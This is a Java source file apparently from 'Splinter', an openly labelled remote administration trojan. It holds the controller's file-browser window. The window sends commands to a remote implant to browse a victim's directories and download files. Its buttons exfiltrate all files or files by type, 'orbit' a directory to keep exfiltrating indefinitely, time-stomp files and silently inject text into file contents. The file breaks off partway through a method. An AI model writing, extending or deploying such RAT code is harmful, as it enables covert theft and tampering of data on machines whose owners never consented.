/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/




package Controller.GUI;

import Controller.Drivers.Drivers;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Container;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.ArrayList;
import java.util.Vector;
import javax.swing.ButtonGroup;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.Timer;
import javax.swing.UIManager;
import javax.swing.border.TitledBorder;
import javax.swing.table.DefaultTableModel;

public class Frame_FileBrowser extends JFrame
  implements ActionListener, ItemListener, KeyListener
{
  private static final String strMyClassName = "Frame_FileBrowser";
  Thread_Terminal myThread = null;
  Object_FileBrowser objFileBrowser_Temp = null;

  JPanel jpnlMain = new JPanel(new BorderLayout());

  JPanel jpnlOverhead = new JPanel(new BorderLayout());
  JLabel jlblHeading = new JLabel("File Browser");

  JSplitPane jspltPne_Main = null;

  private JPanel jpnlConsoleOut_Title = new JPanel(new BorderLayout());
  public JPanel_TextDisplayPane jtxtpne_ConsoleOut = new JPanel_TextDisplayPane();
  JScrollPane jscrlPne_ConsoleOut = null;

  JPanel jpnlOptionsMain = new JPanel(new BorderLayout());
  JPanel jpnlOptions = new JPanel(new GridLayout(4, 1, 4, 4));
  JPanel jpnlFileName = new JPanel(new BorderLayout());
  JLabel jlblFileName = new JLabel("File Name:  ");
  JPanel jpnlTextField = new JPanel(new BorderLayout());
  JTextField jtfFileName = new JTextField(12);
  public JComboBox jcbFileName = new JComboBox();

  JPanel jpnlDataExfiltration = new JPanel(new BorderLayout());
  JPanel jpnlPayloadSelection = new JPanel(new GridLayout(1, 5));
  ButtonGroup btngrp_Payload = new ButtonGroup();
  String payloadQuickReference = "Extract";
  JRadioButton jrbPayload_Extractor = new JRadioButton("Extractor", true);
  JRadioButton jrbPayload_Selector = new JRadioButton("Selector", false);
  JRadioButton jrbPayload_Inspector = new JRadioButton("Inspector", false);
  JRadioButton jrbPayload_Injector = new JRadioButton("Injector", false);
  JRadioButton jrbPayload_Alerter = new JRadioButton("Alerter", false);
  String DATA_EXFIL_PAYLOAD_SPECIFICATION = "EXTRACTOR_PAYLOAD";
  JPanel jpnlDataExfiltration_EAST = new JPanel(new BorderLayout());
  JPanel jpnlOrbiterOptionSelection = new JPanel();
  ButtonGroup btngrp_Orbiter = new ButtonGroup();
  JRadioButton jrbOrbiter_Enabled = new JRadioButton("Yes", false);
  JRadioButton jrbOrbiter_Disabled = new JRadioButton("No", true);
  boolean orbiterEnabled = false;
  JPanel jpnlExfiltrationAction = new JPanel();
  JButton jbtnExecute_Exfiltration = new JButton("Execute");

  JPanel jpnlDataExfiltration_FileTypes = new JPanel();
  JTextField jtfDataExfiltrationFileType = new JTextField(5);

  JPanel jpnlDataExfiltration_ContentTypes = new JPanel();
  JTextField jtfDataExfiltrationContentType = new JTextField(6);

  JPanel jpnlFolderRecursionSelection = new JPanel();
  ButtonGroup btngrp_FolderRecursion = new ButtonGroup();
  JRadioButton folderRecursion_Enabled = new JRadioButton("Yes", false);
  JRadioButton folderRecursion_Disabled = new JRadioButton("No", true);
  boolean folderRecursionEnabled = false;

  JPanel jpnlDataExfiltration_EAST_MAIN = new JPanel(new BorderLayout());
  JPanel jpnlDataExfiltration_WEST = new JPanel(new BorderLayout());
  JPanel jpnlCurrentDirectoryFilter = new JPanel(new BorderLayout());
  JLabel jlblCurrentDirectoryFilter = new JLabel("Filter:         ");
  JPanel jpnlCurrentDirectoryFilter_JCB_Alignment = new JPanel(new BorderLayout());
  public JComboBox jcbCurrentDirectoryFilter = new JComboBox();

  JPanel jpnlShortcuts = new JPanel(new BorderLayout());
  JLabel jlblShortcuts = new JLabel("Shortcuts:  ");
  JPanel jpnlShortcuts_JCB_Alignment = new JPanel(new BorderLayout());

  String strShortcuts_Options = "Options";
  String strShortcuts_Cat = "cat";
  String strShortcuts_Download = "Download";
  String strShortcuts_Upload = "Upload";
  String strShortcuts_ShareDirectory = "Share Directory";
  String strShortcuts_TimeStompFile = "Time Stomp";
  String strShortcuts_SetMode = "Set Mode i.e. chmod";
  String strShortcuts_Move = "Move";
  String strShortcuts_Delete = "Delete";
  Object[] arrShortcuts = { this.strShortcuts_Options, this.strShortcuts_Cat, this.strShortcuts_Download, this.strShortcuts_Upload, this.strShortcuts_ShareDirectory, this.strShortcuts_TimeStompFile, this.strShortcuts_SetMode, this.strShortcuts_Move, this.strShortcuts_Delete };
  JComboBox jcbShortcuts = new JComboBox(this.arrShortcuts);
  JButton jbtnExecute = new JButton("Execute");

  JPanel jpnlMainButtons = new JPanel(new GridLayout(1, 5));
  JButton jbtnOpen = new JButton("Open");
  JButton jbtnCancel = new JButton("Cancel");
  JButton jbtnOrbitDirectory = new JButton("Orbit Directory");
  JButton jbtnExfilFilesByType = new JButton("Exfil Files By Type");
  JButton jbtnExfilAllFiles = new JButton("Exfil All Files");

  public volatile String emptyDirectoryPath_only_used_if_alCurrFileList_is_empty = "";

  public volatile boolean enableRecursive = false;
  Object_FileBrowser objOrbitFileDirectory = null;
  String strCurrentPath = "";

  public volatile boolean i_am_connected_to_implant = false;

  JPanel jpnlFileBrowswer = new JPanel(new BorderLayout());

  public JTable_FileBrowser_Solomon jtblFileBrowser = null;
  public static final String[] arrJTableColNames = { "Extension", "File", "Path", "Size", "Permission", "Date Last Modified", Drivers.strJTableColumn_InsertID };
  public static Vector<String> vctJTableColNames = new Vector(1, 1);
  public static Vector<String> vctJTableToolTips = new Vector(1, 1);

  public ArrayList<Object_FileBrowser> alNewFileRoots = new ArrayList();
  public ArrayList<Object_FileBrowser> alCurrFileRoots = new ArrayList();

  public ArrayList<Object_FileBrowser> alNewFileList = new ArrayList();
  public ArrayList<Object_FileBrowser> alCurrFileList = new ArrayList();

  public volatile Object_FileBrowser objFileBrowser_EmptyDirectory = null;

  public volatile boolean updateFileRoots = false;
  public volatile boolean updateFileList = false;
  public volatile boolean continueRun = false;
  public volatile boolean processUpdateInterrupt = false;

  int rowClicked_JTable = 0;
  int index_fleBrowserObject_in_arraylist = 0;

  Timer tmrUpdateFileList = null;

  boolean attemptJTableLookup = true;

  public Frame_FileBrowser(Thread_Terminal terminal)
  {
    try
    {
      this.myThread = terminal;
      this.continueRun = false;
      this.myThread.frameFileBrowserIsDisposed = false;

      this.myThread.myFileBrowser = this;
      setTitle("Splinter - RAT vrs 1.41 - BETA         File Browser @" + this.myThread.getRHOST_IP());
      setBounds(500, 100, 860, 740);
      try
      {
        setIconImage(Drivers.imgFrameIcon); } catch (Exception localException1) {
      }
      getContentPane().add(this.jpnlMain);

      this.jlblHeading.setText("File Browser @" + this.myThread.getRHOST_IP());
      this.jpnlOverhead.add("North", this.jlblHeading);
      this.jpnlMain.add("North", this.jpnlOverhead);
      try
      {
        vctJTableColNames.clear();
        vctJTableToolTips.clear();
      }
      catch (Exception localException2) {
      }
      for (int i = 0; i < arrJTableColNames.length; i++)
      {
        vctJTableColNames.add(arrJTableColNames[i]);
        vctJTableToolTips.add(arrJTableColNames[i]);
      }

      this.jtblFileBrowser = new JTable_FileBrowser_Solomon(vctJTableColNames, vctJTableToolTips, "FILE BROWSER - " + this.myThread.getJListData(), Color.blue.darker(), null);

      this.jpnlFileBrowswer.add("Center", this.jtblFileBrowser);

      this.jpnlOptions.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Options", 4, 2, null, new Color(0, 51, 255)));

      this.jpnlOptionsMain.add("Center", this.jpnlOptions);

      this.jpnlFileBrowswer.add("South", this.jpnlOptionsMain);

      this.jpnlOptionsMain.setVisible(false);

      this.jpnlFileName.add("West", this.jlblFileName);

      this.jpnlTextField.add("South", this.jcbFileName);
      this.jpnlFileName.add("Center", this.jpnlTextField);
      this.jlblFileName.setToolTipText("Search the current path for an indicated file name");
      this.jpnlOptions.add(this.jpnlFileName);

      this.jpnlCurrentDirectoryFilter.add("West", this.jlblCurrentDirectoryFilter);
      this.jpnlCurrentDirectoryFilter_JCB_Alignment.add("South", this.jcbCurrentDirectoryFilter);
      this.jpnlCurrentDirectoryFilter.add("Center", this.jpnlCurrentDirectoryFilter_JCB_Alignment);

      this.jpnlOptions.add(this.jpnlCurrentDirectoryFilter);

      this.jpnlShortcuts.add("West", this.jlblShortcuts);
      this.jpnlShortcuts_JCB_Alignment.add("South", this.jcbShortcuts);
      this.jpnlShortcuts.add("Center", this.jpnlShortcuts_JCB_Alignment);
      this.jpnlShortcuts.add("East", this.jbtnExecute);
      this.jpnlOptions.add(this.jpnlShortcuts);

      this.jpnlMainButtons.add(this.jbtnOrbitDirectory);
      this.jpnlMainButtons.add(this.jbtnExfilFilesByType);
      this.jpnlMainButtons.add(this.jbtnExfilAllFiles);

      this.jpnlMainButtons.add(this.jbtnOpen);
      this.jpnlMainButtons.add(this.jbtnCancel);
      this.jpnlOptions.add(this.jpnlMainButtons);

      this.jpnlDataExfiltration.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Data Exfiltration", 4, 2, null, new Color(0, 51, 255)));

      this.jpnlPayloadSelection.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Payload", 2, 2, null, new Color(0, 51, 255)));
      this.btngrp_Payload.add(this.jrbPayload_Extractor);
      this.btngrp_Payload.add(this.jrbPayload_Alerter);
      this.btngrp_Payload.add(this.jrbPayload_Selector);
      this.btngrp_Payload.add(this.jrbPayload_Inspector);
      this.btngrp_Payload.add(this.jrbPayload_Injector);

      this.jpnlPayloadSelection.add(this.jrbPayload_Extractor);
      this.jpnlPayloadSelection.add(this.jrbPayload_Alerter);
      this.jpnlPayloadSelection.add(this.jrbPayload_Selector);
      this.jpnlPayloadSelection.add(this.jrbPayload_Inspector);
      this.jpnlPayloadSelection.add(this.jrbPayload_Injector);

      this.jpnlDataExfiltration.add("Center", this.jpnlPayloadSelection);

      this.jpnlDataExfiltration_WEST.add("Center", this.jpnlDataExfiltration_ContentTypes);
      this.jpnlDataExfiltration_WEST.add("West", this.jpnlDataExfiltration_FileTypes);
      this.jpnlDataExfiltration_WEST.add("East", this.jpnlFolderRecursionSelection);
      this.jpnlDataExfiltration_EAST_MAIN.add("West", this.jpnlDataExfiltration_WEST);

      this.jpnlDataExfiltration_ContentTypes.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Contents", 2, 2, null, new Color(0, 51, 255)));
      this.jpnlDataExfiltration_ContentTypes.add(this.jtfDataExfiltrationContentType);
      this.jtfDataExfiltrationContentType.setText("*.*");
      this.jtfDataExfiltrationContentType.setHorizontalAlignment(0);
      this.jtfDataExfiltrationContentType.addActionListener(this);

      this.jpnlDataExfiltration_FileTypes.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "File Types", 2, 2, null, new Color(0, 51, 255)));
      this.jpnlDataExfiltration_FileTypes.add(this.jtfDataExfiltrationFileType);
      this.jtfDataExfiltrationFileType.setText("*.*");
      this.jtfDataExfiltrationFileType.setHorizontalAlignment(0);
      this.jtfDataExfiltrationFileType.addActionListener(this);

      this.jpnlFolderRecursionSelection.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Recurse Sub-Dirs?", 2, 2, null, new Color(0, 51, 255)));
      this.btngrp_FolderRecursion.add(this.folderRecursion_Enabled);
      this.btngrp_FolderRecursion.add(this.folderRecursion_Disabled);

      this.jpnlFolderRecursionSelection.add(this.folderRecursion_Enabled);
      this.jpnlFolderRecursionSelection.add(this.folderRecursion_Disabled);

      this.folderRecursion_Enabled.addActionListener(this);
      this.folderRecursion_Disabled.addActionListener(this);

      this.jpnlFolderRecursionSelection.setToolTipText("If Enabled, specified diretory (top folder) and all sub-folders under top folder will be included in the exploit");
      this.folderRecursion_Enabled.setToolTipText("If Enabled, specified diretory (top folder) and all sub-folders under top folder will be included in the exploit");
      this.folderRecursion_Disabled.setToolTipText("If Enabled, specified diretory (top folder) and all sub-folders under top folder will be included in the exploit");

      this.jpnlDataExfiltration.add("East", this.jpnlDataExfiltration_EAST_MAIN);

      this.jpnlDataExfiltration_EAST_MAIN.add("East", this.jpnlDataExfiltration_EAST);
      this.jpnlDataExfiltration_EAST.add("West", this.jpnlOrbiterOptionSelection);
      this.jpnlDataExfiltration_EAST.add("East", this.jpnlExfiltrationAction);

      this.jpnlOrbiterOptionSelection.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Enable Orbiter?", 2, 2, null, new Color(0, 51, 255)));
      this.btngrp_Orbiter.add(this.jrbOrbiter_Enabled);
      this.btngrp_Orbiter.add(this.jrbOrbiter_Disabled);

      this.jpnlOrbiterOptionSelection.add(this.jrbOrbiter_Enabled);
      this.jpnlOrbiterOptionSelection.add(this.jrbOrbiter_Disabled);

      this.jpnlOrbiterOptionSelection.setToolTipText("If Enabled, this payload will loiter the specified directory to maintain exploit indefinitely");
      this.jrbOrbiter_Enabled.setToolTipText("If Enabled, this payload will loiter the specified directory to maintain exploit indefinitely");
      this.jrbOrbiter_Disabled.setToolTipText("If Enabled, this payload will loiter the specified directory to maintain exploit indefinitely");

      this.jpnlExfiltrationAction.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Action", 2, 2, null, new Color(0, 51, 255)));
      this.jpnlExfiltrationAction.add(this.jbtnExecute_Exfiltration);

      this.jpnlOptionsMain.add("North", this.jpnlDataExfiltration);

      this.jrbPayload_Extractor.addActionListener(this);
      this.jrbPayload_Alerter.addActionListener(this);
      this.jrbPayload_Injector.addActionListener(this);
      this.jrbPayload_Inspector.addActionListener(this);
      this.jrbPayload_Selector.addActionListener(this);
      this.jrbOrbiter_Disabled.addActionListener(this);
      this.jrbOrbiter_Enabled.addActionListener(this);
      this.jbtnExecute_Exfiltration.addActionListener(this);
      this.jtfDataExfiltrationFileType.setToolTipText("File Filter Specification");
      this.jpnlDataExfiltration_FileTypes.setToolTipText("File Filter Specification");
      this.jpnlDataExfiltration_ContentTypes.setToolTipText("Content Filter Specification");
      this.jtfDataExfiltrationContentType.setToolTipText("Content Filter Specification");

      this.jrbPayload_Extractor.setToolTipText("<html><b>Blanket File Extraction</b><br> Extract all files (*.*) or files types from specified directory satisfying File Filter Specification</html>");
      this.jrbPayload_Alerter.setToolTipText("<html><b>Silent <u>File</u> Monitor, No Exfil</b><br>Monitor directory for presence of file name(s) satisfying File Filter Specification and provide alert on match (no exfil)</html>");
      this.jrbPayload_Injector.setToolTipText("<html><b>\"<u>The Diddler</u>\"</b><br>Replace contents within files satisfying File Content character sequence specifications with injected character sequence on all specified file types</html>");
      this.jrbPayload_Inspector.setToolTipText("<html><b>Silent <u>Content</u> Monitor, No Exfil</b><br>Inspect indicated files for content annotated in File Content Specification. Provide Alert on match (no exfil)</html>");
      this.jrbPayload_Selector.setToolTipText("<html><b>Content Interrogation First, Select File and Exfiltrate on Match</b><br>Inspect indicated files for content annotated in File Content Specification. Exfiltrate files matching indicated parameters</html>");

      this.jtfDataExfiltrationContentType.setEditable(false);
      this.jtfDataExfiltrationContentType.setBackground(Color.gray.brighter());

      this.jscrlPne_ConsoleOut = new JScrollPane(this.jtxtpne_ConsoleOut);
      this.jpnlConsoleOut_Title.add("Center", this.jscrlPne_ConsoleOut);
      this.jpnlConsoleOut_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Console Out", 4, 2, null, new Color(0, 51, 255)));

      this.jspltPne_Main = new JSplitPane(0, this.jpnlFileBrowswer, this.jpnlConsoleOut_Title);
      this.jspltPne_Main.setOneTouchExpandable(true);
      this.jspltPne_Main.setDividerLocation(600);

      this.jpnlMain.add("North", this.jpnlOverhead);
      this.jpnlMain.add("Center", this.jspltPne_Main);

      this.i_am_connected_to_implant = true;

      this.jtfFileName.setEditable(false);

      this.jbtnCancel.addActionListener(this);
      this.jbtnOrbitDirectory.addActionListener(this);
      this.jbtnExfilFilesByType.addActionListener(this);
      this.jbtnExfilAllFiles.addActionListener(this);
      this.jbtnExecute.addActionListener(this);
      this.jbtnOpen.addActionListener(this);
      this.jtblFileBrowser.jcbFileRoots.addActionListener(this);
      this.jtblFileBrowser.jbtnMoveUpDirectory.addActionListener(this);
      this.jtblFileBrowser.jbtnNewDirectory.addActionListener(this);
      this.jtblFileBrowser.jbtnRefresh.addActionListener(this);
      this.jtblFileBrowser.jbtnSearch.addActionListener(this);
      this.jtblFileBrowser.jbtnShare.addActionListener(this);
      this.jtblFileBrowser.jtfCurrentPath.addActionListener(this);
      this.jtblFileBrowser.jbtnDelete.addActionListener(this);
      this.jcbCurrentDirectoryFilter.addActionListener(this);

      this.jtblFileBrowser.jbtnShare.setEnabled(false);
      this.jtblFileBrowser.jbtnSearch.setEnabled(false);
      this.jtblFileBrowser.jbtnRefresh.setEnabled(false);

      this.continueRun = true;
      this.processUpdateInterrupt = false;
      this.tmrUpdateFileList = new Timer(100, this);
      this.tmrUpdateFileList.start();
    }
    catch (Exception e)
    {
      Driver.eop("Constructor", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    this.jtblFileBrowser.jtblMyJTbl.addMouseListener(new MouseAdapter()
    {
      public void mouseClicked(MouseEvent me)
      {
        try
        {
          if (me.getClickCount() == 2)
          {
            if (Frame_FileBrowser.this.attemptJTableLookup)
            {
              Frame_FileBrowser.this.rowClicked_JTable = Frame_FileBrowser.this.jtblFileBrowser.jtblMyJTbl.getSelectedRow();

              Frame_FileBrowser.this.index_fleBrowserObject_in_arraylist = Integer.parseInt((String)Frame_FileBrowser.this.jtblFileBrowser.dfltTblMdl.getValueAt(Frame_FileBrowser.this.rowClicked_JTable, Frame_FileBrowser.this.jtblFileBrowser.myInsertID_ColumnIndex));

              Frame_FileBrowser.this.objFileBrowser_Temp = ((Object_FileBrowser)Frame_FileBrowser.this.alCurrFileList.get(Frame_FileBrowser.this.index_fleBrowserObject_in_arraylist));

              if (Frame_FileBrowser.this.objFileBrowser_Temp.i_am_a_file)
              {
                if (Drivers.jop_Confirm("You selected File:\n" + Frame_FileBrowser.this.objFileBrowser_Temp.myFile_fullPath + "\n\nDo you wish to download this file?", "Download File?") == 0)
                {
                  Frame_FileBrowser.this.myThread.sendCommand_RAW("download\"" + Frame_FileBrowser.this.objFileBrowser_Temp.myFile_fullPath.trim() + "\"");
                }

              }
              else
              {
                Frame_FileBrowser.this.myThread.sendCommand_RAW("[SPLINTER_IMPLANT]%%%%%FILE_BROWSER_MAP_DIRECTORY%%%%%" + Frame_FileBrowser.this.objFileBrowser_Temp.myFile_fullPath);
              }
            }
            else
            {
              Drivers.jop_Warning("Please enter full path in the \"Current Path\" field", "Unable to complete selected action");
            }
          }

        }
        catch (Exception e)
        {
          Frame_FileBrowser.this.attemptJTableLookup = false;
          Drivers.eop("addMouseListener", "Frame_FileBrowser", e, "Perhaps error occurred from the deleted column in the renderer but that is still present in the default table model", false);
        }
      }
    });
    addWindowListener(new WindowAdapter()
    {
      public void windowClosing(WindowEvent e)
      {
        Frame_FileBrowser.this.closeFrame();
      }
    });
  }

  public Object_FileBrowser getSelectedFileObject_From_JTable()
  {
    try
    {
      int clickedRow = this.jtblFileBrowser.jtblMyJTbl.getSelectedRow();

      if (clickedRow < 0)
      {
        return null;
      }

      int index = Integer.parseInt((String)this.jtblFileBrowser.dfltTblMdl.getValueAt(clickedRow, this.jtblFileBrowser.myInsertID_ColumnIndex));

      return (Object_FileBrowser)this.alCurrFileList.get(index);
    }
    catch (Exception e)
    {
      Driver.eop("getSelectedFileBrowserObject", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    return null;
  }

  public boolean updateFileRoots()
  {
    try {
      try {
        this.jtblFileBrowser.jcbFileRoots.removeAllItems(); } catch (Exception localException1) {
      }
      for (int i = 0; i < this.alCurrFileRoots.size(); i++)
      {
        this.jtblFileBrowser.jcbFileRoots.addItem(((Object_FileBrowser)this.alCurrFileRoots.get(i)).getJList_FileRoots());
      }

      try
      {
        if ((((Object_FileBrowser)this.alCurrFileRoots.get(0)).i_am_a_directory) || (((Object_FileBrowser)this.alCurrFileRoots.get(0)).i_am_a_drive))
        {
          this.strCurrentPath = ((Object_FileBrowser)this.alCurrFileRoots.get(0)).myFile_fullPath;
          this.jtblFileBrowser.jtfCurrentPath.setText(((Object_FileBrowser)this.alCurrFileRoots.get(0)).myFile_fullPath);
        }
        else
        {
          this.strCurrentPath = ((Object_FileBrowser)this.alCurrFileRoots.get(0)).myFile_parentDirectory;
          this.jtblFileBrowser.jtfCurrentPath.setText(((Object_FileBrowser)this.alCurrFileRoots.get(0)).myFile_parentDirectory);
        }
      } catch (Exception e) {
        this.jtblFileBrowser.jtfCurrentPath.setText("");
      }
      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("updateFileRoots", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public Object_FileBrowser getSelectedFileObject_From_JComboBox()
  {
    try
    {
      String shortcutFileName = (String)this.jcbFileName.getSelectedItem();

      if ((shortcutFileName == null) || (shortcutFileName.trim().equals("")))
      {
        return null;
      }

      shortcutFileName = shortcutFileName.trim();

      Object_FileBrowser objFile = null;

      for (int i = 0; i < this.alCurrFileList.size(); i++)
      {
        objFile = (Object_FileBrowser)this.alCurrFileList.get(i);

        if ((objFile != null) && (objFile.i_am_a_file))
        {
          if ((objFile.myFile_fullPath != null) && (objFile.myFile_fullPath.trim().equalsIgnoreCase(shortcutFileName)))
          {
            return objFile;
          }

          if ((objFile.myFile_fle != null) && (objFile.myFile_fle.trim().equalsIgnoreCase(shortcutFileName)))
          {
            return objFile;
          }
        }
      }
    }
    catch (Exception e)
    {
      Driver.eop("getSelectedFileObject_From_JComboBox", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    return null;
  }

  public boolean executeShortcut()
  {
    try
    {
      Object_FileBrowser fleShortcut = getSelectedFileObject_From_JTable();

      if (fleShortcut == null)
      {
        fleShortcut = getSelectedFileObject_From_JComboBox();
      }

      if ((fleShortcut == null) || (!fleShortcut.i_am_a_file))
      {
        Drivers.jop("Please select a file in order to continue...");
        return false;
      }

      String strShortcutOption = (String)this.jcbShortcuts.getSelectedItem();

      if (strShortcutOption == null)
      {
        Drivers.jop("Please select a valid shortcut option");
        return false;
      }

      if (strShortcutOption.equalsIgnoreCase(this.strShortcuts_Cat))
      {
        this.myThread.sendCommand_RAW("[SPLINTER_IMPLANT]%%%%%CAT_FILE%%%%%" + fleShortcut.myFile_fullPath);
        return true;
      }

      if (strShortcutOption.equalsIgnoreCase(this.strShortcuts_Delete))
      {
        Drivers.jop("Ready to delete File: " + fleShortcut.myFile_fullPath);
        return true;
      }

      if (strShortcutOption.equalsIgnoreCase(this.strShortcuts_Download))
      {
        Drivers.jop("Ready to download File: " + fleShortcut.myFile_fullPath);
        return true;
      }

      if (strShortcutOption.equalsIgnoreCase(this.strShortcuts_Upload))
      {
        Drivers.jop("Ready to Upload File: " + fleShortcut.myFile_fullPath);
        return true;
      }

      if (strShortcutOption.equalsIgnoreCase(this.strShortcuts_ShareDirectory))
      {
        if (!fleShortcut.i_am_a_file)
        {
          Drivers.jop("Ready to Share Directory: " + fleShortcut.myFile_fullPath);
        }
        else
        {
          Drivers.jop("Ready to Share Directory: " + fleShortcut.myFile_parentDirectory);
        }
        return true;
      }

      Drivers.jop("Invalid or Unsupported feature selected");
      return false;
    }
    catch (Exception e)
    {
      Drivers.eop("executeShortcut", "Frame_FileBrowser", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.tmrUpdateFileList)
      {
        if ((this.continueRun) && (this.processUpdateInterrupt))
        {
          this.processUpdateInterrupt = false;

          if (this.updateFileRoots)
          {
            this.updateFileRoots = false;

            updateFileRoots();
          }

          if (this.updateFileList)
          {
            this.updateFileList = false;
            updateFileList();
          }

        }

      }
      else if (ae.getSource() == this.jbtnOrbitDirectory)
      {
        String orbitPath = queryOrbitDirectoryPath("Orbit");

        if ((orbitPath != null) && (queryRecursiveOrbitDirectory(orbitPath) > -1))
        {
          int delyMillis = queryDelayInterval_Millis();

          String fileTypes = queryOrbitDirectoryFileTyes();

          this.jtxtpne_ConsoleOut.appendString(true, "", "Trusting User Input. Orbiter Directory Path: \"" + orbitPath + "\"" + " Orbiter Extraction File Type: \"" + fileTypes + "\"" + " Recursive Directory Extraction enabled: " + this.enableRecursive + " Delay in seconds: " + "\"" + delyMillis + "\"", Drivers.clrController, Drivers.clrBackground);
          try
          {
            this.myThread.sendCommand_RAW("ORBIT_DIRECTORY, " + orbitPath.trim() + ", " + fileTypes + ", " + this.enableRecursive + ", " + delyMillis);
          }
          catch (Exception ee) {
            Drivers.sop("UNABLE TO SEND ORBIT COMMAND!!!  TRY FROM THE MAIN CONTROLLER FRAME INSTEAD");
          }
        }
        else {
          this.jtxtpne_ConsoleOut.appendString(true, "", "Automated Data Exfiltration Canceled", Drivers.clrController, Drivers.clrBackground);
        }

      }
      else if (ae.getSource() == this.jbtnExfilFilesByType)
      {
        String orbitPath = queryOrbitDirectoryPath("Extract");

        if ((orbitPath != null) && (queryRecursiveOrbitDirectory(orbitPath) > -1))
        {
          String fileTypes = queryOrbitDirectoryFileTyes();

          this.jtxtpne_ConsoleOut.appendString(true, "", "Trusting User Input. Orbiter Directory Path: \"" + orbitPath + "\"" + " Extraction File Type: \"" + fileTypes + "\"" + " Recursive Directory Extraction enabled: " + this.enableRecursive, Drivers.clrController, Drivers.clrBackground);
          try
          {
            this.myThread.sendCommand_RAW("EXFIL_DIRECTORY, " + orbitPath.trim() + ", " + fileTypes + ", " + this.enableRecursive);
          } catch (Exception ee) {
            Drivers.sop("UNABLE TO SEND EXTRACTION COMMAND!!!  TRY FROM THE MAIN CONTROLLER FRAME INSTEAD");
          }
        }
        else {
          this.jtxtpne_ConsoleOut.appendString(true, "", "Automated Data Exfiltration Canceled", Drivers.clrController, Drivers.clrBackground);
        }

      }
      else if (ae.getSource() == this.jbtnExfilAllFiles)
      {
        String orbitPath = queryOrbitDirectoryPath("Extract");

        if ((orbitPath != null) && (queryRecursiveOrbitDirectory(orbitPath) > -1))
        {
          String fileTypes = "*.*";

          this.jtxtpne_ConsoleOut.appendString(true, "", "Trusting User Input. Orbiter Directory Path: \"" + orbitPath + "\"" + " Extraction File Type: \"" + fileTypes + "\"" + " Recursive Directory Extraction enabled: " + this.enableRecursive, Drivers.clrController, Drivers.clrBackground);
          try
          {
            this.myThread.sendCommand_RAW("EXFIL_DIRECTORY, " + orbitPath.trim() + ", " + fileTypes + ", " + this.enableRecursive);
          } catch (Exception ee) {
            Drivers.sop("UNABLE TO SEND EXTRACTION COMMAND!!!  TRY FROM THE MAIN CONTROLLER FRAME INSTEAD");
          }
        }
        else {
          this.jtxtpne_ConsoleOut.appendString(true, "", "Automated Data Exfiltration Canceled", Drivers.clrController, Drivers.clrBackground);
        }

      }
      else if (ae.getSource() == this.jbtnCancel)
      {
        Drivers.jop("Feature not implemented yet...");
      }
      else if (ae.getSource() == this.jbtnExecute)
      {
        executeShortcut();
      }
      else if (ae.getSource() == this.jbtnOpen)
      {
        Drivers.jop("Feature not implemented yet...");
      }
      else if (ae.getSource() == this.jtblFileBrowser.jcbFileRoots)
      {
        this.myThread.sendCommand_RAW("[SPLINTER_IMPLANT]%%%%%FILE_BROWSER_MAP_DIRECTORY%%%%%" + ((Object_FileBrowser)this.alCurrFileRoots.get(this.jtblFileBrowser.jcbFileRoots.getSelectedIndex())).myFile_fle);
      }
      else if (ae.getSource() == this.jtblFileBrowser.jbtnMoveUpDirectory)
      {
        if (this.alCurrFileList.size() < 1)
        {
          this.myThread.sendCommand_RAW("[SPLINTER_IMPLANT]%%%%%FILE_BROWSER_MAP_DIRECTORY%%%%%" + this.objFileBrowser_EmptyDirectory.myFile_parentDirectory);
        }
        else
        {
